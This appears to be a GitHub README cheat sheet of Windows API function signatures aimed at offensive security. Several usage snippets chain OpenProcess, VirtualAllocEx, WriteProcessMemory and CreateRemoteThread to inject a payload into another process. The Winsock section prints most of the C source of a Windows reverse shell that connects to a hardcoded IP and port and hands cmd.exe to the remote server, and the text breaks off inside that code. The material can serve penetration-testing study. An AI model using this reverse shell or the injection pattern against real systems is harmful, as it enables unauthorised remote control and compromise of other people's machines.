<div align="center">
  
  ![API CheatSheets](https://github.com/snowcra5h/windows-api-function-cheatsheets/assets/90065760/f20d276b-68be-481f-a17e-5c6fa4960331)
  
  <p>snowcra5h@icloud.com</p>
  <p><a href="https://twitter.com/snowcra5h" target="_blank" rel="noopener noreferrer">https://twitter.com/snowcra5h</a></p>
</div>

<div align="center">
  
# Windows API Function Cheatsheets

 </div>

## Table of Contents

- [Windows API Function Cheatsheets](#windows-api-function-cheatsheets)
    - [File Operations](#file-operations)
    - [Process Management](#process-management)
    - [Memory Management](#memory-management)
    - [Thread Management](#thread-management)
    - [Dynamic-Link Library (DLL) Management](#dynamic-link-library-dll-management)
    - [Synchronization](#synchronization)
    - [Interprocess Communication](#interprocess-communication)
    - [Windows Hooks](#windows-hooks)
    - [Cryptography](#cryptography)
    - [Debugging](#debugging)
    - [Winsock](#winsock)
    - [Registry Operations](#registry-operations)
    - [Error Handling](#error-handling)
    - [Resource Management](#resource-management)
  - [Unicode String Functions](#unicode-string-functions)
    - [String Length](#string-length)
    - [String Copy](#string-copy)
    - [String Concatenation](#string-concatenation)
    - [String Comparison](#string-comparison)
    - [String Search](#string-search)
    - [Character Classification and Conversion](#character-classification-and-conversion)
  - [Win32 Structs Cheat Sheet](#win32-structs-cheat-sheet)
    - [Common Structs](#common-structs)
    - [Win32 Sockets Structs Cheat Sheet (winsock.h)](#win32-sockets-structs-cheat-sheet-winsockh)
    - [Win32 Sockets Structs Cheat Sheet (winsock2.h)](#win32-sockets-structs-cheat-sheet-winsock2h)
    - [Win32 Sockets Structs Cheat Sheet (ws2def.h)](#win32-sockets-structs-cheat-sheet-ws2defh)

## Windows API Function Calls
### File Operations
[CreateFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
```c
HANDLE CreateFile(
  LPCTSTR lpFileName,
  DWORD dwDesiredAccess,
  DWORD dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD dwCreationDisposition,
  DWORD dwFlagsAndAttributes,
  HANDLE hTemplateFile
); // Opens an existing file or creates a new file.
```
[ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile)
```c
BOOL ReadFile(
  HANDLE hFile,
  LPVOID lpBuffer,
  DWORD nNumberOfBytesToRead,
  LPDWORD lpNumberOfBytesRead,
  LPOVERLAPPED lpOverlapped
); // Reads data from the specified file.
```
[WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)
```c
BOOL WriteFile(
  HANDLE hFile,
  LPCVOID lpBuffer,
  DWORD nNumberOfBytesToWrite,
  LPDWORD lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
); // Writes data to the specified file.
```
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
```c
BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
```

### Process Management
[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
); // Opens an existing local process object. e.g., try to open target process
```
```c
hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
```
[CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
```c
HANDLE CreateProcess(
  LPCTSTR lpApplicationName,
  LPTSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
); // The CreateProcess function creates a new process that runs independently of the creating process. For simplicity, this relationship is called a parent-child relationship.
```
```c
// Start the child process
// No module name (use command line), Command line, Process handle not inheritable, Thread handle not inheritable, Set handle inheritance to FALSE, No creation flags, Use parent's environment block, Use parent's starting directory, Pointer to STARTUPINFO structure, Pointer to PROCESS_INFORMATION structure
CreateProcess( NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); 
```
[WinExec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
```c
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
); // Runs the specified application.
```
```c
result = WinExec(L"C:\\Windows\\System32\\cmd.exe", SW_SHOWNORMAL);
```
[TerminateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess)
```c
BOOL TerminateProcess(
  HANDLE hProcess,
  UINT uExitCode
); // Terminates the specified process.
```
[ExitWindowsEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-exitwindowsex)
```c
BOOL ExitWindowsEx(
  [in] UINT  uFlags,
  [in] DWORD dwReason
); // Logs off the interactive user, shuts down the system, or shuts down and restarts the system.
```
```c
bResult = ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION);
```
[CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
```c
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
); // used to obtain information about processes and threads running on a Windows system.
```
[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
```c
BOOL Process32First(
  [in]      HANDLE           hSnapshot,
  [in, out] LPPROCESSENTRY32 lppe
); // used to retrieve information about the first process encountered in a system snapshot, which is typically taken using the CreateToolhelp32Snapshot function.
```
[Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
```c
BOOL Process32Next(
  [in]  HANDLE           hSnapshot,
  [out] LPPROCESSENTRY32 lppe
); // used to retrieve information about the next process in a system snapshot after Process32First has been called. This function is typically used in a loop to enumerate all processes captured in a snapshot taken using the CreateToolhelp32Snapshot function.
```
[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
); // Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.
```
```c
WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); // pRemoteCode from VirtualAllocEx
```
[ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)
```c
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
); // ReadProcessMemory copies the data in the specified address range from the address space of the specified process into the specified buffer of the current process.
```
```c
bResult = ReadProcessMemory(pHandle, (void*)baseAddress, &address, sizeof(address), 0);
```

### Memory Management
[VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,                // Shellcode must be between 0x1 and 0x10000 bytes (page size)
  DWORD flAllocationType,       // #define MEM_COMMIT 0x00001000
  DWORD flProtect               // #define PAGE_EXECUTE_READWRITE 0x00000040  
); // Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process.
```
[VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
); // Reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero.
```
```c
pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
```
[VirtualFree](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree)
```c
BOOL VirtualFree(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD dwFreeType
); // Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process.
```
[VirtualProtect function (memoryapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
```c
BOOL VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
); // Changes the protection on a region of committed pages in the virtual address space of the calling process.
```
[RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)
```c
VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
); // Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
```

### Thread Management
[CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,         // A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle.
  [in]            SIZE_T                  dwStackSize,                // The initial size of the stack, in bytes.
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,             // A pointer to the application-defined function of type LPTHREAD_START_ROUTINE
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,                // A pointer to a variable to be passed to the thread function.
  [in]            DWORD                   dwCreationFlags,            // The flags that control the creation of the thread.
  [out, optional] LPDWORD                 lpThreadId                  // A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.
); // Creates a thread to execute within the virtual address space of the calling process.
```
```c
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, 0);
```
[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
); // Creates a thread that runs in the virtual address space of another process.
```
```c
hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory
```
[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)
```c
HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
); // Creates a thread that runs in the virtual address space of another process and optionally specifies extended attributes such as processor group affinity.
   // See InitializeProcThreadAttributeList
```
```c
hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, lpAttributeList, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory
```
[ExitThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread)
```c
VOID ExitThread(
  DWORD dwExitCode
); // Terminates the calling thread and returns the exit code to the operating system.
```
[GetExitCodeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getexitcodethread)
```c
BOOL GetExitCodeThread(
  HANDLE hThread,
  LPDWORD lpExitCode
); // Retrieves the termination status of the specified thread.
```
[ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
```c
DWORD ResumeThread(
  HANDLE hThread
); // Decrements a thread's suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed.
```
[SuspendThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
```c
DWORD SuspendThread(
  HANDLE hThread
); // Suspends the specified thread.
```
[TerminateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminatethread)
```c
BOOL TerminateThread(
  HANDLE hThread,
  DWORD dwExitCode
); // Terminates the specified thread.
```
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
```c
BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
```

### Dynamic-Link Library (DLL) Management
[LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
```c
HMODULE LoadLibrary(
  LPCTSTR lpFileName
); // Loads a dynamic-link library (DLL) module into the address space of the calling process.
```
[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
```c
FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR lpProcName
); // Retrieves the address of an exported function or variable from the specified DLL.
```
```c
pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
```

[FreeLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary)
```c
BOOL FreeLibrary(
  HMODULE hModule
); // Frees the loaded DLL module and, if necessary, decrements its reference count.
```

### Synchronization
[CreateMutex](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa)
```c
HANDLE CreateMutex(
  LPSECURITY_ATTRIBUTES lpMutexAttributes,
  BOOL bInitialOwner,
  LPCTSTR lpName
); // Creates a named or unnamed mutex object.
```
[CreateSemaphore](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createsemaphorea)
```c
HANDLE CreateSemaphore(
  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,
  LONG lInitialCount,
  LONG lMaximumCount,
  LPCTSTR lpName
); // Creates a named or unnamed semaphore object.
```
[ReleaseMutex](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasemutex)
```c
BOOL ReleaseMutex(
  HANDLE hMutex
); // Releases ownership of the specified mutex object.
```
[ReleaseSemaphore](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasesemaphore)
```c
BOOL ReleaseSemaphore(
  HANDLE hSemaphore,
  LONG lReleaseCount,
  LPLONG lpPreviousCount
); // Increases the count of the specified semaphore object by a specified amount.
```
[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
```c
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
); // Waits until the specified object is in the signaled state or the time-out interval elapses.
```
```c
WaitForSingleObject(hThread, 500);
```

### Interprocess Communication
[CreatePipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
```c
BOOL CreatePipe(
  PHANDLE hReadPipe,
  PHANDLE hWritePipe,
  LPSECURITY_ATTRIBUTES lpPipeAttributes,
  DWORD nSize
); // Creates an anonymous pipe and returns handles to the read and write ends of the pipe.
```
[CreateNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
```c
HANDLE CreateNamedPipe(
  LPCTSTR lpName,
  DWORD dwOpenMode,
  DWORD dwPipeMode,
  DWORD nMaxInstances,
  DWORD nOutBufferSize,
  DWORD nInBufferSize,
  DWORD nDefaultTimeOut,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes
); // Creates a named pipe and returns a handle for subsequent pipe operations.
```
[ConnectNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
```c
BOOL ConnectNamedPipe(
  HANDLE hNamedPipe,
  LPOVERLAPPED lpOverlapped
); // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe.
```
[DisconnectNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-disconnectnamedpipe)
```c
BOOL DisconnectNamedPipe(
  HANDLE hNamedPipe
); // Disconnects the server end of a named pipe instance from a client process.
```
[CreateFileMapping](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)
```c
HANDLE CreateFileMapping(
  HANDLE hFile,
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  DWORD flProtect,
  DWORD dwMaximumSizeHigh,
  DWORD dwMaximumSizeLow,
  LPCTSTR lpName
); // Creates or opens a named or unnamed file mapping object for a specified file.
```
[MapViewOfFile](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)
```c
LPVOID MapViewOfFile(
  HANDLE hFileMappingObject,
  DWORD dwDesiredAccess,
  DWORD dwFileOffsetHigh,
  DWORD dwFileOffsetLow,
  SIZE_T dwNumberOfBytesToMap
); // Maps a view of a file mapping into the address space of the calling process.
```
[UnmapViewOfFile](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-unmapviewoffile)
```c
BOOL UnmapViewOfFile(
  LPCVOID lpBaseAddress
); // Unmaps a mapped view of a file from the calling process's address space.
```
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
```c
BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
```

### Windows Hooks
[SetWindowsHookExA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
```c
HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
); // Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.
```
[CallNextHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex)
```c
LRESULT CallNextHookEx(
  [in, optional] HHOOK  hhk,
  [in]           int    nCode,
  [in]           WPARAM wParam,
  [in]           LPARAM lParam
); // Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information.
```
[UnhookWindowsHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex)
```c
BOOL UnhookWindowsHookEx(
  [in] HHOOK hhk
); // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
```
[GetAsyncKeyState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate)
```c
SHORT GetAsyncKeyState(
  [in] int vKey
); // Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.
```
[GetKeyState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate)
```c
SHORT GetKeyState(
  [in] int nVirtKey
); // Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off—alternating each time the key is pressed).
```
[GetKeyboardState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate)
```c
BOOL GetKeyboardState(
  [out] PBYTE lpKeyState
); // Copies the status of the 256 virtual keys to the specified buffer.
```

### Cryptography
[CryptBinaryToStringA](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptbinarytostringa)
```c
BOOL CryptBinaryToStringA(
  [in]            const BYTE *pbBinary,
  [in]            DWORD      cbBinary,
  [in]            DWORD      dwFlags,
  [out, optional] LPSTR      pszString,
  [in, out]       DWORD      *pcchString
); // The CryptBinaryToString function converts an array of bytes into a formatted string.
```
[CryptDecrypt](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt)
```c
BOOL CryptDecrypt(
  [in]      HCRYPTKEY  hKey,
  [in]      HCRYPTHASH hHash,
  [in]      BOOL       Final,
  [in]      DWORD      dwFlags,
  [in, out] BYTE       *pbData,
  [in, out] DWORD      *pdwDataLen
); // The CryptDecrypt function decrypts data previously encrypted by using the CryptEncrypt function.
```
[CryptEncrypt](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptencrypt)
```c
BOOL CryptEncrypt(
  [in]      HCRYPTKEY  hKey,
  [in]      HCRYPTHASH hHash,
  [in]      BOOL       Final,
  [in]      DWORD      dwFlags,
  [in, out] BYTE       *pbData,
  [in, out] DWORD      *pdwDataLen,
  [in]      DWORD      dwBufLen
); // The CryptEncrypt function encrypts data. The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter.
```
[CryptDecryptMessage](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecryptmessage)
```c
BOOL CryptDecryptMessage(
  [in]                PCRYPT_DECRYPT_MESSAGE_PARA pDecryptPara,
  [in]                const BYTE                  *pbEncryptedBlob,
  [in]                DWORD                       cbEncryptedBlob,
  [out, optional]     BYTE                        *pbDecrypted,
  [in, out, optional] DWORD                       *pcbDecrypted,
  [out, optional]     PCCERT_CONTEXT              *ppXchgCert
); // The CryptDecryptMessage function decodes and decrypts a message.
```
[CryptEncryptMessage]()
```c
BOOL CryptEncryptMessage(
  [in]      PCRYPT_ENCRYPT_MESSAGE_PARA pEncryptPara,
  [in]      DWORD                       cRecipientCert,
  [in]      PCCERT_CONTEXT []           rgpRecipientCert,
  [in]      const BYTE                  *pbToBeEncrypted,
  [in]      DWORD                       cbToBeEncrypted,
  [out]     BYTE                        *pbEncryptedBlob,
  [in, out] DWORD                       *pcbEncryptedBlob
); // The CryptEncryptMessage function encrypts and encodes a message.
```

### Debugging
[IsDebuggerPresent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)
```c
BOOL IsDebuggerPresent(); // Determines whether the calling process is being debugged by a user-mode debugger.
```
[CheckRemoteDebuggerPresent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent)
```c
BOOL CheckRemoteDebuggerPresent(
  [in]      HANDLE hProcess,
  [in, out] PBOOL  pbDebuggerPresent
); // Determines whether the specified process is being debugged.
```
[OutputDebugStringA](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa)
```c
void OutputDebugStringA(
  [in, optional] LPCSTR lpOutputString
); // Sends a string to the debugger for display.
```

### Winsock
```c
/*** Windows Reverse Shell
 * 
 *   ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
 * ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
 * ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
 *   ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
 * ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
 * ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
 * ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
 * ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
 *       ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
 *                                   Written by: snowcra5h@icloud.com (snowcra5h) 2023
 *
 * This program establishes a reverse shell via the Winsock2 library. It is
 * designed to establish a connection to a specified remote server, and execute commands
 * received from the server on the local machine, giving the server
 * control over the local machine.
 *
 * Compile command (using MinGW on Wine):
 * wine gcc.exe windows.c -o windows.exe -lws2_32
 *
 * This code is intended for educational and legitimate penetration testing purposes only.
 * Please use responsibly and ethically.
 *
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
#include <process.h>

const char* const PORT = "1337";
const char* const IP = "10.37.129.2";

typedef struct {
    HANDLE hPipeRead;
    HANDLE hPipeWrite;
    SOCKET sock;
} ThreadParams;

DWORD WINAPI OutputThreadFunc(LPVOID data);
DWORD WINAPI InputThreadFunc(LPVOID data);
void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock);

int main(int argc, char** argv) {
    WSADATA wsaData;
    int err = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (err != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", err);
        return 1;
    }

    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "Socket function failed with error = %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct addrinfo hints = { 0 };
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* result;
    err = getaddrinfo(IP, PORT, &hints, &result);
    if (err != 0) {
        fprintf(stderr, "Failed to get address info: %d\n", err);
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    if (WSAConnect(sock, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        fprintf(stderr, "Failed to connect.\n");
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hInputWrite, hOutputRead, hInputRead, hOutputWrite;
    if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0) || !CreatePipe(&hInputRead, &hInputWrite, &sa, 0)) {
        fprintf(stderr, "Failed to create pipe.\n");
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = hInputRead;
    startupInfo.hStdOutput = hOutputWrite;
    startupInfo.hStdError = hOutputWrite;
    PROCESS_INFORMATION processInfo;

    WCHAR cmd[] = L"cmd.exe /k";
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        fprintf(stderr, "Failed to create process.\n");
        CleanUp(hInputWrite, hInputRead, hOutputWrite, hOutputRead, processInfo, result, sock);
        return 1;
    }

    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
    CloseHandle(processInfo.hThread);
    ThreadParams outputParams = { hOutputRead, NULL, sock };
    ThreadParams inputParams = { NULL, hInputWrite, sock };
    HANDLE hThread[2];
    hThread[0] = CreateThread(NULL, 0, OutputThreadFunc, &outputParams, 0, NULL);
    hThread[1] = CreateThread(NULL, 0, InputThreadFunc, &inputParams, 0, NULL);

    WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
    CleanUp(hInputWrite, NULL, NULL, hOutputRead, processInfo, result, sock);
    return 0;
}

void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock) {
    if (hInputWrite != NULL) CloseHandle(hInputWrite);
    if (hInputRead != NULL) CloseHandle(hInputRead);
    if (hOutputWrite != NULL) CloseHandle(hOutputWrite);
    if (hOutputRead != NULL) CloseHandle(hOutputRead);
    if (processInfo.hProcess != NULL) CloseHandle(processInfo.hProcess);
    if (processInfo.hThread != NULL) CloseHandle(processInfo.hThread);
    if (result != NULL) freeaddrinfo(result);
    if (sock != NULL) closesocket(sock);
    WSACleanup();
}

DWORD WINAPI OutputThreadFunc(LPVOID data) {
    ThreadParams* params = (ThreadParams*)data;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(params->hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        send(params->sock, buffer, bytesRead, 0);
    }
    return 0;
}

DWORD WINAPI InputThreadFunc(LPVOID data) {
    ThreadParams* params = (ThreadParams*)data;
    char buffer[4096];
    int bytesRead;
